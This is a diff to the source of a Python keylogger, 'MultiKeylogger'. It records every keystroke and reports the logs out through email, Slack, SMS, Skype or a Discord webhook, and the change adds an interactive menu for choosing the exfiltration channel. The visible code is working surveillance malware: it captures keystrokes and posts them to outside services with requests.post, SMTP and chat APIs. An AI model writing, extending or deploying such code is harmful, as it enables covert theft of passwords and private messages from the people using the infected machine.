@@ -1,4 +1,3 @@
-import email # Imported to handle email addresses
 import keyboard # Imported to provide the ability to log keys
 import smtplib # Imported to provide the ability to send the recorded key logs though SMTP protocol for email
 
@@ -13,7 +12,7 @@ import os
 
 from skpy import Skype # Imported to use Skype
 
-import requests 
+import requests # Imported to use request for discord integration
 
 load_dotenv() # Loads environment to use variable in .env
 SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']
@@ -80,8 +79,8 @@ class MultiKeylogger:
     def reportDiscord(self, discordBody, logTime):
         discordMessage = logTime + "\n" + discordBody # Creates string variable of log time interval and then on the next line the key logs
         data = {
-            "content": discordMessage,
-            "username": "Keylogger"
+            "content": discordMessage, # Contend of the message
+            "username": "Keylogger" # Name of the bot/webhook
         }
         messagePost = requests.post(DISCORD_URL, json = data)
         try:
@@ -117,17 +116,17 @@ class MultiKeylogger:
             self.createFileIdentifier() # Executes the function that creates the file id/name
             self.createID() # Executes the function createId for report types other than file
 
-            if self.reportType == "File":
+            if self.reportType == "FILE":
                 self.reportFile() # Calls the reportFile function to create a file for keylog recording
-            elif self.reportType == "Email":
+            elif self.reportType == "EMAIL":
                 self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.identifier) # Calls the reportEmail function to sends an email of keylog recording
-            elif self.reportType == "Slack":
+            elif self.reportType == "SLACK":
                 self.reportSlack(self.identifier) # Calls the reportSlack function to send keylogs as a slack message in a "keylogger" channel
             elif self.reportType == "SMS":
                 self.reportSMS(EMAIL, EMAIL_PW, self.keylog) # Calls the reportSMS function to send keylogs via an SMS to an AT&T phone number
-            elif self.reportType == "Skype":
+            elif self.reportType == "SKYPE":
                 self.reportSkype(EMAIL, EMAIL_PW, self.keylog, self.identifier) # Calls the reportSkype function to send keylogs to a desginated Skype group chat
-            elif self.reportType == "Discord":
+            elif self.reportType == "DISCORD":
                 self.reportDiscord(self.keylog, self.identifier) # Calls the reportDiscord function to send keylogs to a desginated Discord group chat
             
             self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
@@ -144,16 +143,37 @@ class MultiKeylogger:
         keyboard.wait() 
 
 if __name__ == "__main__":
-        """
-        Uncomment the report type desired and comment the others
-        """
-        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
-        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
-        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
-        multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
-        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
-        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Skype")
-        multiKeylogger.start()
+        inputCheck = False # Creates a boolean variable for use in the while loop
+        print("Please enter one of the following report type options: FILE, EMAIL, DISCORD, SLACK, SMS, or SKYPE ") # Statement in terminal explaining what users should do
+        while inputCheck == False: # While loop when inputCheck is false
+            userReportType = input("Enter the desired report type for the keylogger: ") # Takes input as a string variable
+            userReportType = userReportType.upper() # Makes string variable uppercase
+            if userReportType == "FILE":
+                inputCheck = True
+                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
+                multiKeylogger.start()
+            elif userReportType == "EMAIL":
+                inputCheck = True
+                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
+                multiKeylogger.start()
+            elif userReportType == "DISCORD":
+                inputCheck = True
+                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
+                multiKeylogger.start()
+            elif userReportType == "SLACK":
+                inputCheck = True
+                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
+                multiKeylogger.start()
+            elif userReportType == "SMS":
+                inputCheck = True
+                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
+                multiKeylogger.start()
+            elif userReportType == "SKYPE":
+                inputCheck = True
+                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
+                multiKeylogger.start()
+            else:
+                print("Please retry with one of the following options: FILE, EMAIL, DISCORD, SLACK, SMS, or SKYPE") # Prints error message
 
 
 
